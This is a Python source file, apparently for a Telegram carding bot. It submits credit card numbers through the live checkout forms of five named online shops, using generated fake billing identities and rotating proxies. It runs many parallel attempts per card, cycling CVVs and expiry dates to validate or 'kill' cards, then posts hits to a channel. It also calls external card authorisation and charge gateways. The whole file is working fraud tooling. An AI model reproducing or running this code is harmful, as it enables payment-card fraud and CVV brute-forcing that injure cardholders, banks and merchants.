    "transaction was declined", "card was declined", "card has been declined",
    "payment was declined", "payment has been declined",
    "your card was declined", "your card has been declined",
    "insufficient funds", "do not honor", "not authorized", "not approved",
    "invalid card", "invalid credit card", "invalid cvv", "cvv is incorrect",
    "incorrect cvv", "cvv mismatch", "expired card", "card has expired",
    "unable to process your payment", "could not process your payment",
    "cannot process your payment", "please try another card",
    "please use a different card", "please check your card",
    "order failed", "error processing your", "processing error",
]
SUCCESS_PHRASES = [
    "thank you for your order", "your order has been placed",
    "your order was placed", "order has been confirmed", "order was confirmed",
    "order confirmation", "purchase complete", "purchase was successful",
    "payment received", "payment was successful",
]

def extract_visible_text(html):
    if not html: return ""
    if HAS_BS4:
        try:
            h = re.sub(r"<script\b[^>]*>.*?</script>", " ", html, flags=re.DOTALL | re.I)
            h = re.sub(r"<style\b[^>]*>.*?</style>", " ", h, flags=re.DOTALL | re.I)
            soup = BeautifulSoup(h, "html.parser")
            for tag in soup(["noscript", "template"]): tag.decompose()
            return re.sub(r"\s+", " ", soup.get_text(separator=" ", strip=True)).strip()
        except Exception:
            pass
    import html as _html
    h = re.sub(r"<script[^>]*>.*?</script>", " ", html, flags=re.DOTALL | re.I)
    h = re.sub(r"<style[^>]*>.*?</style>", " ", h, flags=re.DOTALL | re.I)
    h = re.sub(r"<[^>]+>", " ", h)
    return re.sub(r"\s+", " ", _html.unescape(h)).strip()

def analyze_response(url, html):
    url = url or ""
    html = html or ""
    visible = extract_visible_text(html)
    vis_lower = visible.lower()

    if len(html) < 100:
        stripped = html.strip()
        if stripped.startswith("{"):
            try:
                js = json.loads(stripped)
                msg = js.get("error") or js.get("message") or js.get("status") or "Blocked"
                return {"status": "DECLINED", "message": f"Site: {msg}"[:90]}
            except Exception:
                pass
        elif stripped and "<" not in stripped:
            return {"status": "DECLINED", "message": f"Site: {stripped[:40]}"}

    ovr = re.search(r'id="OrderValidationResult"[^>]*value="([^"]+)"', html, re.I)
    if ovr:
        val = ovr.group(1).strip()
        if val.lower() != "valid":
            friendly = {
                'merchantdecline': 'Merchant Decline', 'generalordererror': 'Order Error',
                'incomplete': 'Incomplete Info', 'invalidcard': 'Invalid Card',
                'carddeclined': 'Card Declined', 'cvv': 'CVV Error',
                'expired': 'Expired Card', 'emptyorder': 'Empty Order'
            }
            return {"status": "DECLINED", "message": friendly.get(val.lower().replace(' ', ''), val.title())[:90]}

    vm = re.search(r"var\s+valResult\s*=\s*\[([^\]]+)\]", html, re.I)
    if vm:
        vals = [x.strip().strip("'\"") for x in vm.group(1).split(',')]
        if 'Valid' in vals and 'MerchantDecline' not in vals:
            return {"status": "APPROVED", "message": "Valid"}
        if 'MerchantDecline' in vals: return {"status": "DECLINED", "message": "Merchant Decline"}
        if 'GeneralOrderError' in vals: return {"status": "DECLINED", "message": "Order Error"}
        if 'CardExpired' in vals or 'ExpiredCard' in vals: return {"status": "DECLINED", "message": "Card Expired"}
        if 'InvalidCardNumber' in vals or 'InvalidCVV' in vals: return {"status": "DECLINED", "message": "Invalid Card"}
        if 'EmptyOrder' in vals: return {"status": "DECLINED", "message": "Empty Order"}
        if vals: return {"status": "DECLINED", "message": f"Decline: {vals[0][:30]}"}

    for phrase in DECLINE_PHRASES:
        if phrase in vis_lower:
            return {"status": "DECLINED", "message": "Declined"}

    for phrase in SUCCESS_PHRASES:
        if phrase in vis_lower:
            return {"status": "APPROVED", "message": "Success"}

    if re.search(r"/checkout/[a-f0-9]+/step[2-9]", url):
        return {"status": "APPROVED", "message": "Redirect step2/3"}

    if "thank you" in html.lower() or "ThankYouPage" in html:
        return {"status": "APPROVED", "message": "Thank You"}

    if 'CreditCardNumber' in html and 'PaymentMethod' in html:
        return {"status": "DECLINED", "message": "Form Returned"}

    if "/confirm" in url.lower() or "/out" in url.lower() or "outcome" in url.lower():
        return {"status": "DECLINED", "message": "Order Declined"}

    return {"status": "ERROR", "message": f"No Signal (len={len(html)})"}

# ==========================================
# KILLER ATTEMPTS
# ==========================================
def attempt_aerojet(card, proxy_str):
    BASE = "https://aerojetsweeper.com"
    px = {"http": proxy_str, "https": proxy_str} if proxy_str else None
    profile = gen_profile(); s = fresh_session(proxy_str); t0 = time.perf_counter()
    try:
        r = s.get(f"{BASE}/", proxies=px, timeout=REQ_T)
        if r.status_code != 200:
            return {"status": "ERROR", "msg": f"Home {r.status_code}", "time": time.perf_counter() - t0}
        mvisit = s.cookies.get("mvisit")
        if not mvisit:
            return {"status": "ERROR", "msg": "No mvisit", "time": time.perf_counter() - t0}
        ch = "9bcb4a"
        try:
            idx = s.get(f"{BASE}/Checkout/Index?m={mvisit}", proxies=px, timeout=REQ_T)
            h = re.search(r"/checkout/([a-f0-9]+)/step1", idx.text)
            if h: ch = h.group(1)
        except Exception:
            pass
        s.get(f"{BASE}/checkout/{ch}/step1?m={mvisit}", proxies=px, timeout=REQ_T)
        data = {
            'PageOffers[0].OfferId': '161396', 'PageOffers[0].OfferName': 'AeroJet Sweeper $39.99 + FREE SH',
            'PageOffers[0].Quantity': '1', 'PaymentMethod': 'card', 'ContainsCreditCard': 'True',
            'ContainsShippingData': 'True', 'ContainsBillingData': 'True', 'AutoDetectCreditCardType': 'True',
            'HasFinalCheckoutButton': 'True', 'IsEmailConfirmationRequired': 'False', 'zipPrecalculation': profile['zip'],
            'CreditCardNumber': card['number'], 'CreditCardMonth': card['month'],
            'CreditCardYear': card['year'], 'CreditCardSecurityCode': card['cvv'],
            'BillingFirstName': profile['first_name'], 'BillingLastName': profile['last_name'],
            'BillingEmail': profile['email'], 'BillingPhone': profile['phone'],
            'BillingAddress1': profile['address1'], 'BillingAddress2': profile['address2'],
            'BillingZip': profile['zip'], 'BillingCity': profile['city'],
            'BillingStateId': profile['state_id'], 'BillingCountryId': profile['country_id'],
            'MailingListAgreement': 'false', 'SmsListAgreement': 'False',
            'ShippingSameAsBilling': ['true', 'false'],
            'ShippingFirstName': profile['first_name'], 'ShippingLastName': profile['last_name'],
            'ShippingAddress1': profile['address1'], 'ShippingAddress2': profile['address2'],
            'ShippingZip': profile['zip'], 'ShippingCity': profile['city'],
            'ShippingStateId': profile['state_id'], 'ShippingCountryId': profile['country_id'],
            'ShippingEmail': profile['email'], 'ShippingPhone': profile['phone'],
            'CreditCardBin': card['bin'],
        }
        rp = s.post(f"{BASE}/checkout/{ch}/step1", params={"m": mvisit}, data=data,
                    proxies=px, timeout=REQ_T, allow_redirects=False)
        post_location = rp.headers.get('Location', '')
        html = ""
        if "step1" in post_location or rp.status_code == 200:
            try:
                html = s.get(f"{BASE}/checkout/{ch}/step1?m={mvisit}&", proxies=px, timeout=REQ_T).text
            except Exception:
                pass
        a = analyze_response(rp.url, html)
        return {"status": a["status"], "msg": a["message"], "time": time.perf_counter() - t0}
    except Exception as e:
        return {"status": "ERROR", "msg": type(e).__name__, "time": time.perf_counter() - t0}
    finally:
        close_session(s)

def attempt_dazz(card, proxy_str):
    BASE = "https://buydazz.com"
    px = {"http": proxy_str, "https": proxy_str} if proxy_str else None
    profile = gen_profile(); s = fresh_session(proxy_str); t0 = time.perf_counter()
    try:
        s.get(f"{BASE}/", proxies=px, timeout=REQ_T)
        data = {
            "checkoutFormHidden": "1", "AutoDetectCreditCardType": "True",
            "PageOffers[0].OfferId": "162141", "PageOffers[0].OfferName": "Dazz Standard", "PageOffers[0].Quantity": "0",
            "PageOffers[1].OfferId": "162142", "PageOffers[1].OfferName": "Dazz Deluxe", "PageOffers[1].Quantity": "1",
            "ContainsCreditCard": "True", "ContainsShippingData": "True", "ContainsBillingData": "True",
            "HasFinalCheckoutButton": "True", "PaymentMethod": "card",
            "CreditCardNumber": card['number'], "CreditCardMonth": card['month'], "CreditCardYear": card['year'],
            "CreditCardSecurityCode": card['cvv'], "BillingEmail": profile['email'],
            "BillingFirstName": profile['first_name'], "BillingLastName": profile['last_name'],
            "BillingAddress1": profile['address1'], "BillingAddress2": profile['address2'],
            "BillingZip": profile['zip'], "BillingCity": profile['city'], "BillingCountryId": profile['country_id'],
            "_country_US": "1", "BillingStateId": profile['state_id'], "BillingPhone": profile['phone'],
            "PromoCode": "", "ShippingSameAsBilling": "true", "ShippingEmail": profile['email'],
            "ShippingFirstName": profile['first_name'], "ShippingLastName": profile['last_name'],
            "ShippingAddress1": profile['address1'], "ShippingAddress2": profile['address2'],
            "ShippingZip": profile['zip'], "ShippingCity": profile['city'], "ShippingCountryId": profile['country_id'],
            "ShippingStateId": profile['state_id'], "ShippingPhone": profile['phone'],
            "IsZipMismatchConfirmed": "true", "CreditCardBin": card['bin']
        }
        r = s.post(f"{BASE}/", data=data, proxies=px, timeout=REQ_T)
        a = analyze_response(r.url, r.text or "")
        return {"status": a["status"], "msg": a["message"], "time": time.perf_counter() - t0}
    except Exception as e:
        return {"status": "ERROR", "msg": type(e).__name__, "time": time.perf_counter() - t0}
    finally:
        close_session(s)

def attempt_microtouch(card, proxy_str):
    BASE = "https://microtouchgroom.com"
    px = {"http": proxy_str, "https": proxy_str} if proxy_str else None
    profile = gen_profile(); s = fresh_session(proxy_str); t0 = time.perf_counter()
    try:
        s.get(f"{BASE}/", proxies=px, timeout=REQ_T)
        visit_id = s.cookies.get("mvisit")
        if not visit_id:
            return {"status": "ERROR", "msg": "No mvisit", "time": time.perf_counter() - t0}
        r = s.post(f"{BASE}/cart/AddOffersQuantity/",
                   json={"offers": '[{"offer":"160657","quantity":1}]', "withCartReset": False,
                         "stepNumber": 0, "templateEntryId": 4662009},
                   headers={"content-type": "application/json", "x-requested-with": "XMLHttpRequest"},
                   proxies=px, timeout=REQ_T)
        try:
            j = r.json()
            order_id = j.get("OrderNumberString") or str(j.get("OrderNumber", ""))
        except Exception:
            order_id = ""
        if not order_id:
            return {"status": "ERROR", "msg": "No orderId", "time": time.perf_counter() - t0}
        r = s.get(f"{BASE}/Checkout/Index", params={"m": visit_id}, proxies=px, timeout=REQ_T)
        m = re.search(r"/checkout/([a-f0-9]+)/step1", r.text)
        if not m:
            return {"status": "ERROR", "msg": "No hash", "time": time.perf_counter() - t0}
        h = m.group(1)
        s.get(f"{BASE}/checkout/{h}/step1?m={visit_id}", proxies=px, timeout=REQ_T)
        xhr = {"content-type": "application/x-www-form-urlencoded", "x-requested-with": "XMLHttpRequest"}
        model = {
            "ContainsCreditCard": "True", "ContainsShippingData": "True", "ContainsBillingData": "True",
            "ShippingCountryId": profile["country_id"], "ShippingFirstName": profile["first_name"],
            "ShippingLastName": profile["last_name"], "ShippingEmail": profile["email"],
            "ShippingPhone": profile["phone"], "ShippingAddress1": profile["address1"],
            "ShippingZip": profile["zip"], "ShippingCity": profile["city"], "ShippingStateId": profile["state_id"],
            "BillingSameAsShipping": True, "BillingCountryId": profile["country_id"],
            "BillingFirstName": profile["first_name"], "BillingLastName": profile["last_name"],
            "BillingEmail": profile["email"], "BillingPhone": profile["phone"],
            "BillingAddress1": profile["address1"], "BillingZip": profile["zip"],
            "BillingCity": profile["city"], "BillingStateId": profile["state_id"]
        }
        s.post(f"{BASE}/checkout/{h}/saveclientinfo",
               data={"model": json.dumps(model), "visitId": visit_id, "orderId": order_id},
               headers=xhr, proxies=px, timeout=REQ_T)
        s.post(f"{BASE}/checkout/{h}/lset",
               data={"response": "CheckoutForm submit true", "orderId": order_id},
               headers=xhr, proxies=px, timeout=REQ_T)
        step1_data = {
            "PageOffers[0].OfferId": "161158", "PageOffers[0].OfferName": "SH", "PageOffers[0].Quantity": "1",
            "CartOffers[0].OfferId": "160657", "CartOffers[0].OfferName": "Solo Titanium", "CartOffers[0].Quantity": "1",
            "PaymentMethod": "card", "ContainsCreditCard": "True", "ContainsShippingData": "True",
            "ContainsBillingData": "True", "AutoDetectCreditCardType": "True",
            "CreditCardNumber": card["number"], "CreditCardMonth": card["month"],
            "CreditCardYear": card["year"], "CreditCardSecurityCode": card["cvv"],
            "zipPrecalculation": profile["zip"],
            "ShippingFirstName": profile["first_name"], "ShippingLastName": profile["last_name"],
            "ShippingEmail": profile["email"], "ShippingPhone": profile["phone"],
            "ShippingAddress1": profile["address1"], "ShippingZip": profile["zip"],
            "ShippingCity": profile["city"], "ShippingStateId": profile["state_id"],
            "ShippingCountryId": profile["country_id"], "BillingSameAsShipping": "true",
            "BillingFirstName": profile["first_name"], "BillingLastName": profile["last_name"],
            "BillingEmail": profile["email"], "BillingPhone": profile["phone"],
            "BillingAddress1": profile["address1"], "BillingZip": profile["zip"],
            "BillingCity": profile["city"], "BillingStateId": profile["state_id"],
            "BillingCountryId": profile["country_id"], "CreditCardBin": card["bin"],
        }
        r = s.post(f"{BASE}/checkout/{h}/step1", params={"m": visit_id}, data=step1_data,
                   proxies=px, timeout=REQ_T, allow_redirects=True)
        a = analyze_response(r.url, r.text)
        return {"status": a["status"], "msg": a["message"], "time": time.perf_counter() - t0}
    except Exception as e:
        return {"status": "ERROR", "msg": type(e).__name__, "time": time.perf_counter() - t0}
    finally:
        close_session(s)

def attempt_ontel(card, proxy_str):
    BASE = "https://ontelcatalog.com"
    px = {"http": proxy_str, "https": proxy_str} if proxy_str else None
    profile = gen_profile(); s = fresh_session(proxy_str); t0 = time.perf_counter()
    try:
        s.get(f"{BASE}/", proxies=px, timeout=REQ_T)
        mvisit = s.cookies.get("mvisit")
        if not mvisit:
            return {"status": "ERROR", "msg": "No mvisit", "time": time.perf_counter() - t0}
        s.post(f"{BASE}/api/cart/add",
               json={"items": [{"productId": 140014, "quantity": 1}], "withCartReset": False},
               headers={"content-type": "application/json"}, proxies=px, timeout=REQ_T)
        ch = "3bd189"
        try:
            idx = s.get(f"{BASE}/Checkout/Index?m={mvisit}", proxies=px, timeout=REQ_T)
            h = re.search(r"/checkout/([a-f0-9]+)/step1", idx.text)
            if h: ch = h.group(1)
        except Exception:
            pass
        checkout_url = f"{BASE}/checkout/{ch}/step1?m={mvisit}"
        s.get(checkout_url, proxies=px, timeout=REQ_T)
        form_data = {
            'CartOffers[0].OfferId': '140014', 'CartOffers[0].OfferName': 'Chill Zone', 'CartOffers[0].Quantity': '1',
            'IsHidePayPalForMultiPay': 'False', 'PaymentMethod': 'card', 'ShowCheckoutConfirm': 'False',
            'CheckoutConfirmTitle': '', 'CheckoutConfirmText': '', 'ContainsCreditCard': 'True',
            'ContainsShippingData': 'True', 'ContainsBillingData': 'True', 'ContainsPromoCode': 'False',
            'AutoDetectCreditCardType': 'True', 'HasFinalCheckoutButton': 'True', 'ContainsGift': 'False',
            'ContainsAdditionalData': 'False', 'IsEmailConfirmationRequired': 'False',
            'zipPrecalculation': profile['zip'], 'ShippingEmail': profile['email'],
            'ShippingFirstName': profile['first_name'], 'ShippingLastName': profile['last_name'],
            'ShippingAddress1': profile['address1'], 'ShippingAddress2': profile['address2'],
            'ShippingZip': profile['zip'], 'ShippingCity': profile['city'],
            'ShippingStateId': profile['state_id'], 'ShippingCountryId': '1',
            'ShippingPhone': profile['phone'], 'BillingSameAsShipping': ['true', 'false'],
            'MailingListAgreement': 'false', 'SmsListAgreement': 'False',
            'CreditCardNumber': card['number'], 'CreditCardMonth': card['month'],
            'CreditCardYear': card['year'], 'CreditCardSecurityCode': card['cvv'],
            'CreditCardBin': card['bin']
        }
        r = s.post(f"{BASE}/checkout/{ch}/step1", params={"m": mvisit}, data=form_data,
                   headers={**s.headers, "content-type": "application/x-www-form-urlencoded",
                            "origin": BASE, "referer": checkout_url},
                   proxies=px, timeout=REQ_T, allow_redirects=True)
        a = analyze_response(r.url, r.text)
        return {"status": a["status"], "msg": a["message"], "time": time.perf_counter() - t0}
    except Exception as e:
        return {"status": "ERROR", "msg": type(e).__name__, "time": time.perf_counter() - t0}
    finally:
        close_session(s)

def attempt_vibratone(card, proxy_str):
    BASE = "https://www.vibratone.com"
    px = {"http": proxy_str, "https": proxy_str} if proxy_str else None
    profile = gen_profile(); s = fresh_session(proxy_str); t0 = time.perf_counter()
    try:
        s.get(f"{BASE}/", proxies=px, timeout=REQ_T)
        if not s.cookies.get("mvisit"):
            return {"status": "ERROR", "msg": "No mvisit", "time": time.perf_counter() - t0}
        data = [
            ("checkoutFormHidden", "1"), ("AutoDetectCreditCardType", "True"),
            ("PageOffers[0].OfferId", "159953"), ("PageOffers[0].OfferName", "Black"), ("PageOffers[0].Quantity", "1"),
            ("PageOffers[1].OfferId", "159953"), ("PageOffers[1].OfferName", "Black"), ("PageOffers[1].Quantity", "1"),
            ("ContainsCreditCard", "True"), ("ContainsShippingData", "True"), ("ContainsBillingData", "True"),
            ("HasFinalCheckoutButton", "True"), ("PaymentMethod", "card"),
            ("CreditCardNumber", card["number"]), ("CreditCardMonth", card["month"]),
            ("CreditCardYear", card["year"]), ("CreditCardSecurityCode", card["cvv"]),
            ("BillingEmail", profile["email"]), ("BillingFirstName", profile["first_name"]),
            ("BillingLastName", profile["last_name"]), ("BillingAddress1", profile["address1"]),
            ("BillingZip", profile["zip"]), ("BillingCity", profile["city"]),
            ("BillingStateId", profile["state_id"]), ("BillingPhone", profile["phone"]),
            ("ShippingSameAsBilling", "true"), ("ShippingEmail", profile["email"]),
            ("ShippingFirstName", profile["first_name"]), ("ShippingLastName", profile["last_name"]),
            ("ShippingAddress1", profile["address1"]), ("ShippingZip", profile["zip"]),
            ("ShippingCity", profile["city"]), ("ShippingStateId", profile["state_id"]),
            ("ShippingPhone", profile["phone"])
        ]
        rp = s.post(f"{BASE}/", data=data, proxies=px, timeout=REQ_T, allow_redirects=True)
        a = analyze_response(rp.url, rp.text)
        return {"status": a["status"], "msg": a["message"], "time": time.perf_counter() - t0}
    except Exception as e:
        return {"status": "ERROR", "msg": type(e).__name__, "time": time.perf_counter() - t0}
    finally:
        close_session(s)

KILLER_FUNCS = {'aerojet': attempt_aerojet, 'dazz': attempt_dazz,
                'microtouch': attempt_microtouch, 'ontel': attempt_ontel,
                'vibratone': attempt_vibratone}

def attempt_with_retry(func, card, proxy, alt=None, pool=None):
    res = func(card, proxy)
    if res['status'] != 'ERROR': return res
    proxy_strike(proxy)

    cand = None
    if pool:
        opts = [p for p in pool if p and p != proxy and not is_proxy_burned(p)]
        if opts: cand = random.choice(opts)
    if cand:
        res = func(alt or card, cand)
        if res['status'] != 'ERROR': return res
        proxy_strike(cand)

    res_direct = func(alt or card, None)
    return res_direct if res_direct['status'] != 'ERROR' else res

# ==========================================
# API GATEWAYS
# ==========================================
def _clean_api_msg(msg, limit=120):
    m = re.sub(r"\s+", " ", str(msg or "")).strip()
    return "" if m.lower() in ("none", "null") else m[:limit]

NICE_DECLINE = {
    "declined": "Your card was declined.", "decline": "Your card was declined.",
    "card declined": "Your card was declined.", "card was declined": "Your card was declined.",
    "do not honor": "Do Not Honor", "insufficient funds": "Insufficient Funds",
    "incorrect cvc": "Incorrect CVC", "incorrect_number": "Incorrect Card Number",
    "incorrect_cvc": "Incorrect CVC", "expired": "Expired Card", "expired_card": "Expired Card",
    "generic_decline": "Generic Decline", "pickup_card": "Pickup Card",
    "restricted_card": "Restricted Card", "fraudulent": "Fraudulent", "invalid": "Invalid Card",
}
DECLINE_HINTS = ("declin", "insufficient", "do not honor", "not authorized", "not approved",
                 "incorrect", "invalid", "expired", "pickup", "restricted", "cvc",
                 "fraud", "generic", "try another card", "different card")

def looks_declined(msg):
    low = (msg or "").lower()
    return any(w in low for w in DECLINE_HINTS)

def nice_decline(msg):
    m = _clean_api_msg(msg)
    if not m: return "Your card was declined."
    key = m.lower().strip().rstrip(".")
    if key in NICE_DECLINE: return NICE_DECLINE[key]
    if not m.endswith((".", "!", "?")): m += "."
    return m

def _api_get(url, proxy_url=None):
    px = {"http": proxy_url, "https": proxy_url} if proxy_url else None
    return requests.get(url, timeout=REQ_TIMEOUT, proxies=px, verify=False)

def _gateway_call(api_base, label, cc_raw, proxy_url=None, mode="AUTH"):
    t0 = time.perf_counter()
    url = f"{api_base}{quote(cc_raw, safe='')}" if mode == "AUTH" else f"{api_base}/cc={quote(cc_raw, safe='')}"
    if mode == "CHARGE" and proxy_url:
        url += f"/proxy={quote(re.sub(r'^https?://', '', proxy_url.strip()), safe='')}"
    try:
        r = _api_get(url, proxy_url if mode == "AUTH" else None)
        el = round(time.perf_counter() - t0, 2)
        try:
            d = r.json()
        except Exception:
            body = (r.text or "")[:400]
            if looks_declined(body):
                return {"status": "DECLINED", "msg": nice_decline(body), "time": el}
            return {"status": "ERROR", "msg": "Gateway response invalid", "time": el}

        res = str(d.get("result") or d.get("status") or "").strip().upper()
        msg = _clean_api_msg(d.get("message") or d.get("meaning") or d.get("error"))

        if res in ("APPROVED", "CHARGED"):
            if mode == "AUTH":
                return {"status": "APPROVED", "msg": f"Card Added To {label}", "time": el}
            return {"status": "CHARGED" if res == "CHARGED" else "APPROVED", "msg": msg, "time": el}
        if res in ("DECLINED", "DEAD", "HOLD") or looks_declined(msg):
            return {"status": "DECLINED", "msg": nice_decline(msg), "time": el}
        return {"status": "ERROR", "msg": msg or "Unknown gateway reply", "time": el}
    except requests.Timeout:
        return {"status": "ERROR", "msg": "Gateway timeout", "time": round(time.perf_counter() - t0, 2)}
    except requests.ConnectionError:
        return {"status": "ERROR", "msg": "Gateway unreachable", "time": round(time.perf_counter() - t0, 2)}
    except Exception:
        return {"status": "ERROR", "msg": "Gateway busy", "time": round(time.perf_counter() - t0, 2)}

def api_yvex_auth(cc_raw, proxy_url=None): return _gateway_call(YVEX_AUTH_API, "YVex", cc_raw, proxy_url, "AUTH")
def api_rbyte_auth(cc_raw, proxy_url=None): return _gateway_call(RBYTE_AUTH_API, "RByte", cc_raw, proxy_url, "AUTH")
def api_6wex_auth(cc_raw, proxy_url=None): return _gateway_call(WEX_AUTH_API, "6Wex", cc_raw, proxy_url, "AUTH")
def api_bluepay(cc_raw, proxy_url=None): return _gateway_call(BLUEPAY_API_BASE, "BluePay", cc_raw, proxy_url, "CHARGE")
def api_fatzebra(cc_raw, proxy_url=None): return _gateway_call(FATZEBRA_API_BASE, "FatZebra", cc_raw, proxy_url, "CHARGE")
def api_nmi(cc_raw, proxy_url=None): return _gateway_call(NMI_API_BASE, "NMI", cc_raw, proxy_url, "CHARGE")

API_FUNCS = {'bl': api_bluepay, 'fat': api_fatzebra, 'nmi': api_nmi,
             'yv': api_yvex_auth, 'rb': api_rbyte_auth, '6w': api_6wex_auth}

# ==========================================
# ANIMATION
# ==========================================
def start_anim(chat_id, msg_id, builder, stop_event, markup=None, stages=None):
    if not msg_id: return None
    stages = stages or ["Processing"]
    def loop():
        elapsed = 0; i = 0
        while not stop_event.is_set():
            try:
                bot.edit_message_text(builder(elapsed, stages[i % len(stages)]), chat_id, msg_id,
                                      parse_mode='HTML', reply_markup=markup)
            except Exception:
                pass
            for _ in range(5):
                if stop_event.is_set(): return
                time.sleep(1)
            elapsed += 5; i += 1
    t = threading.Thread(target=loop, daemon=True)
    t.start()
    return t

# ==========================================
# KILLER FLOW
# ==========================================
def fmt_killer(gname, card, results, total_t, uname, price=""):
    ap = sum(1 for r in results if r['status'] == 'APPROVED')
    dc = sum(1 for r in results if r['status'] == 'DECLINED')
    fl = sum(1 for r in results if r['status'] == 'ERROR')
    pr = ap + dc
    if ap > 0: ic, st = E_CHECK, f"Killed {E_CHECK}"
    elif dc > 0: ic, st = E_EXCLAMATION, f"Killed {E_EXCLAMATION}"
    else: ic, st = E_SHRUG, f"Failed {E_SHRUG}"
    header = f"{gname} Killer [{price}]" if price else f"{gname} Killer"
    bank, brand, ctype, country, flag = get_bin(card['bin'])
    return (f"{ic} <b>{header} | #{card['bin']}</b>\n"
            f"──────•❥❥•──────\n"
            f"{E_TECH} <b>CC</b> ↠ <code>{card['number']}|{card['month']}|{card['year']}|{card['cvv']}</code>\n"
            f"{E_FLASH} <b>Status</b> ↠ {st}\n"
            f"{E_PICTURE} <b>Processed</b> ↠ ({pr}) | <b>Failed</b> ↠ ({fl})\n"
            f"──────•❥❥•──────\n"
            f"{E_TOOLS} <b>Bank</b> ↠ {h_esc(bank)}\n"
            f"{E_OCTOPUS} <b>Info</b> ↠ {brand} | {ctype}\n"
            f"{E_DIZZY} <b>Country</b> ↠ {h_esc(country)} {flag}\n"
            f"──────•❥❥•──────\n"
            f"{E_THOUGHT} <b>Took</b> ↠ {total_t}s | @{uname}")

def process_killer(message, cc_raw, gw_key):
    uid = message.from_user.id; uname = message.from_user.username or 'User'
    try:
        card = parse_card(cc_raw)
    except Exception:
        return safe_reply(message, f"{E_EXCLAMATION} Invalid format.", parse_mode='HTML')

    user = get_user(uid)
    if not user:
        return safe_reply(message, f"{E_CROSS} User not found.", parse_mode='HTML')

    raw_px = [p.strip() for p in user[6].split('\n') if p.strip()] if user[6] else get_default_proxies()
    reset_strikes()
    px_list = alive_proxies(raw_px)
    gname = KILLER_GATEWAYS[gw_key]['name']; gfunc = KILLER_GATEWAYS[gw_key]['func']
    gw = get_gateway(gw_key); price = gw[2] if gw else ""

    join_markup = json.dumps({"inline_keyboard": [[{"text": "Join CVex Today 💙", "url": FORCE_JOIN_LINK}]]})

    def build(elapsed, stage="Processing"):
        return (f"{E_NUT} <b>Gateway</b> ↠ {gname} [ {price} ]\n"
                f"<b>CC</b> ↠ <code>{cc_raw}</code>\n"
                f"<b>Time</b> ↠ {elapsed}s | {stage}.{E_YELLOW}\n"
                f"──────•❥❥•──────\n"
                f"<b>CC Killing in progress..</b>{E_TOOLS}")

    status_msg = safe_reply(message, build(0), parse_mode='HTML', reply_markup=join_markup)
    stop_anim = threading.Event()
    if status_msg:
        start_anim(message.chat.id, status_msg.message_id, build, stop_anim, join_markup,
                   ["Processing", "Killing", "Ending Checking"])

    cvvs = rotate_cvvs(card['cvv'], KILL_HITS)
    mmyys = gen_mm_yy_list(card['month'], card['year'], KILL_HITS)
    print(f"\n[{time.strftime('%H:%M:%S')}] [+] {gname} | {cc_raw} | Proxies: {len(px_list)}")
    start = time.perf_counter(); results = []
    fn = KILLER_FUNCS[gfunc]

    def runner(ac, alt, proxy):
        r = attempt_with_retry(fn, ac, proxy, alt, px_list)
        r['card'] = ac
        return r

    with ThreadPoolExecutor(max_workers=KILL_WORKERS) as ex:
        futures = []
        for i in range(KILL_HITS):
            ac = {"number": card['number'], "bin": card['bin'], "month": mmyys[i][0],
                  "year": mmyys[i][1], "cvv": cvvs[i]}
            alt = {"number": card['number'], "bin": card['bin'], "month": mmyys[(i + 1) % KILL_HITS][0],
                   "year": mmyys[(i + 1) % KILL_HITS][1], "cvv": cvvs[(i + 1) % KILL_HITS]}
            proxy = None
            for att in range(len(px_list)):
                cand = px_list[(i + att) % len(px_list)]
                if cand is None or not is_proxy_burned(cand):
                    proxy = cand; break
            if proxy is None: proxy = px_list[i % len(px_list)]
            futures.append(ex.submit(runner, ac, alt, proxy))

        for f in as_completed(futures):
            res = f.result(); results.append(res)
            print(f"    [{len(results):>2}/{KILL_HITS}] {res['status']:<10} | {str(res['msg'])[:40]} ({res['time']:.1f}s)")

    total_t = round(time.perf_counter() - start, 1)
    stop_anim.set(); time.sleep(0.35)
    resp = fmt_killer(gname, card, results, total_t, uname, price)
    if status_msg:
        safe_edit(message.chat.id, status_msg.message_id, resp, parse_mode='HTML',
                  disable_web_page_preview=True, reply_markup=join_markup)
    else:
        safe_send(message.chat.id, resp, parse_mode='HTML', reply_markup=join_markup)

    ap = sum(1 for r in results if r['status'] == 'APPROVED')
    dc = sum(1 for r in results if r['status'] == 'DECLINED')
    if ap or dc:
        line = f"{card['number']}|{card['month']}|{card['year']}|{card['cvv']}"
        stat = "CHARGED" if ap else "DECLINED"
        threading.Thread(
            target=send_hit,
            args=(gname, price, line, uname, total_t, ap, len(results) - ap,
                  stat, card['bin'], "KILLER", "KILLER"),
            daemon=True).start()

# ==========================================
# API FLOW
# ==========================================
def fmt_api(gname, price, card, cc_raw, result, took, uname, is_auth=False):
    st = result['status']
    if st in ('APPROVED', 'CHARGED'):
        ic = E_CHECK
        st_t = f"<b>Approved CC</b> {E_CHECK}" if is_auth else f"<b>Charged</b> {E_CHECK}"
    elif st == 'DECLINED':
        ic, st_t = E_EXCLAMATION, f"<b>Declined</b> {E_EXCLAMATION}"
    else:
        ic, st_t = E_SHRUG, f"<b>Failed</b> {E_SHRUG}"

    header = f"{gname} [{price}]" if price else gname
    bank, brand, ctype, country, flag = bin_info_or(result.get('bin_box') or {})

    return (f"{ic} <b>{header} | #{card['bin']}</b>\n"
            f"──────•❥❥•──────\n"
            f"{E_TECH} <b>CC</b> ↠ <code>{cc_raw}</code>\n"
            f"{E_FLASH} <b>Status</b> ↠ {st_t}\n"
            f"{E_PICTURE} <b>Message</b> ↠ <b>{h_esc(result['msg'])}</b>\n"
            f"──────•❥❥•──────\n"
            f"{E_TOOLS} <b>Bank</b> ↠ {h_esc(bank)}\n"
            f"{E_OCTOPUS} <b>Info</b> ↠ {brand} | {ctype}\n"
            f"{E_DIZZY} <b>Country</b> ↠ {h_esc(country)} {flag}\n"
            f"──────•❥❥•──────\n"
            f"{E_THOUGHT} <b>Took</b> ↠ {took}s | @{uname}")

def process_api(message, cc_raw, gw_key):
    uid = message.from_user.id; uname = message.from_user.username or 'User'
    try:
        card = parse_card(cc_raw)
    except Exception:
        return safe_reply(message, f"{E_EXCLAMATION} Invalid format.", parse_mode='HTML')

    user = get_user(uid)
    if not user:
        return safe_reply(message, f"{E_CROSS} User not found.", parse_mode='HTML')

    gw = get_gateway(gw_key)
    if not gw:
        return safe_reply(message, f"{E_CROSS} Gateway missing.", parse_mode='HTML')
    gname = gw[1]; price = gw[2] or ""
    is_auth = (gw[5] == "AUTH")

    proxies = [p.strip() for p in user[6].split('\n') if p.strip()] if user[6] else get_default_proxies()
    if not proxies: proxies = [None]

    join_markup = json.dumps({"inline_keyboard": [[{"text": "Join CVex Today 💙", "url": FORCE_JOIN_LINK}]]})

